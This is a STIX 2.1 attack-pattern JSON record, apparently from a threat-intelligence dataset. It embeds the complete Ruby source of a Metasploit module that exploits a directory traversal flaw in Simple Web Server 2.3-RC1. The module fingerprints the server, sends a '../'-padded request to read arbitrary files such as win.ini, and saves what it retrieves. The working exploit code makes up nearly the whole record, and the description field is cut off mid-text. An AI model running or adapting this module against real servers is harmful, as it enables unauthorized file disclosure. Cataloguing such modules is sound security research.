{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c63fc08f-9d21-4c40-8059-79b3bdc9cf7e",
    "created": "2024-08-14T16:28:42.092773Z",
    "modified": "2024-08-14T16:28:42.092777Z",
    "name": "Simple Web Server 2.3-RC1 Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability found in Simple Web Server 2.3-RC1.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/simple_webserver_traversal.rb",
            "external_id": "simple_webserver_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2013/Jan/12"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Simple Web Server 2.3-RC1 Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability found in\n        Simple Web Server 2.3-RC1.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2002-1864' ],\n          [ 'OSVDB', '88877' ],\n          [ 'EDB', '23886' ],\n          [ 'URL', 'https://seclists.org/bugtraq/2013/Jan/12' ]\n        ],\n      'Author'         =>\n        [\n          'CwG GeNiuS',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2013-01-03'\n    ))\n\n    register_options(\n      [\n        OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\\\win.ini']),\n        OptInt.new('DEPTH',       [true, 'The max traversal depth', 8])\n      ])\n  end\n\n  #\n  # The web server will actually return two HTTP statuses: A 400 (Bad Request), and the actual\n  # HTTP status -- the second one is what we want.  We cannot use the original update_cmd_parts()\n  # in Response, because that will only grab the first HTTP status.\n  #\n  def parse_status_line(res)\n    str = res.to_s\n\n    status_line = str.scan(/HTTP\\/(.+?)\\s+(\\d+)\\s?(.+?)\\r?\\n?$/)\n\n    if status_line.empty?\n      print_error(\"Invalid response command string.\")\n      return\n    elsif status_line.length == 1\n      proto, code, message = status_line[0]\n    else\n      proto, code, message = status_line[1]\n    end\n\n    return message, code.to_i, proto\n  end\n\n\n  #\n  # The MSF API cannot parse this weird response\n  #\n  def parse_body(res)\n    str = res.to_s\n    str.split(/\\r\\n\\r\\n/)[2] || ''\n  end\n\n\n  def is_sws?\n    res = send_request_raw({'uri'=>'/'})\n    if res and res.headers['Server'].to_s =~ /PMSoftware\\-SWS/\n      return true\n    else\n      return false\n    end\n  end\n\n\n  def run_host(ip)\n    if not is_sws?\n      print_error(\"#{ip}:#{rport} - This isn't a Simple Web Server\")\n      return\n    end\n\n    uri = normalize_uri(\"../\"*datastore['DEPTH'], datastore['FILEPATH'])\n    res = send_request_raw({'uri'=>uri})\n\n    if not res\n      print_error(\"#{ip}:#{rport} - Request timed out.\")\n      return\n    end\n\n    # The weird HTTP response totally messes up Rex::Proto::Http::Response, HA!\n    message, code, proto = parse_status_line(res)\n    body                 = parse_body(res)\n\n    if code == 200\n\n      if body.empty?\n        # HD's likes vprint_* in case it's hitting a large network\n        vprint_status(\"#{ip}:#{rport} - File is empty.\")\n        return\n      end\n\n      vprint_line(body)\n      fname = ::File.basename(datastore['FILEPATH'])\n      p = store_loot('simplewebserver.file', 'application/octet-stream', ip, body, fname)\n      print_good(\"#{ip}:#{rport} - #{fname} stored in: #{p}\")\n    else\n      print_error(\"#{ip}:#{rport} - Unable to retrieve file: #{code.to_s} (#{message})\")\n    end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-01-03"
}